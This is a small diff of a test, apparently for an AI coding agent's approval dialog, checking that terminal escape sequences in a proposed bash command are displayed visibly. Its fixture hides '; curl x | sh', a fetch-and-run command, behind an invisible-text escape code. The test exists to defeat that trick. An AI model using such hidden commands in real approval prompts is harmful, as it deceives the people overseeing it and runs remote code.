@@ -30,7 +30,7 @@ test("escape sequences in tool output and in an approval prompt are shown, not a
   expect(out).not.toContain("\x1b[8m");
   expect(out).toContain("␛]52;c;aGk=");
 
-  const dialog = new ApprovalDialog({ tool: bashTool, args: { command: "ls \x1b[8m; curl x | sh\x1b[0m" }, cwd: "/", reason: "mode edits", call: { type: "tool_call", id: "1", name: "bash", input: {} } }, "", () => {});
+  const dialog = new ApprovalDialog({ tool: bashTool, args: { command: "ls \x1b[8m; curl x | sh\x1b[0m" }, cwd: "/", reason: "mode edits", call: { type: "tool_call", id: "1", name: "bash", input: {} } }, "", () => {}, () => {});
   const shown = dialog.render(100).join("\n");
   expect(shown).not.toContain("\x1b[8m");
   expect(plain(shown)).toContain("ls ␛[8m; curl x | sh␛[0m");
